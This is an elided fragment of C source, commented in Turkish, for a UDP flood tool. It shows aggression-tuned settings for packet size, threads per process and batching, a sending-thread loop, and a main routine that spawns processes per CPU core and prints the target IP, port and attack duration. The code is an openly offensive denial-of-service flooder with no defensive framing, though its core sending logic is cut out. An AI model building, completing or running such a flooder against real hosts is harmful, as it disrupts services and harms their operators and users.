...
// AYARLAR
#define PAYLOAD_SIZE 1024        // Daha küçük = daha fazla paket/sn
#define THREAD_PER_PROCESS 200   // Daha yüksek = daha agresif
#define BATCH_SIZE 32            // Toplu gönderim
...
void *udp_gonder(void *arg) {
    ...
    while (calis) {
        // Batch gönderim - her seferinde yeni başlık oluştur
...
int main(int argc, char *argv[]) {
    ...
    int process_count = sysconf(_SC_NPROCESSORS_ONLN) * 2;  // Çekirdek x2
    printf("[+] Hedef: %s:%d\n", hedef_ip, hedef_port);
    printf("[+] Süre: %d saniye\n", sure);
    printf("[+] İşlem: %d, Thread/işlem: %d, Batch: %d\n", 
           process_count, THREAD_PER_PROCESS, BATCH_SIZE);
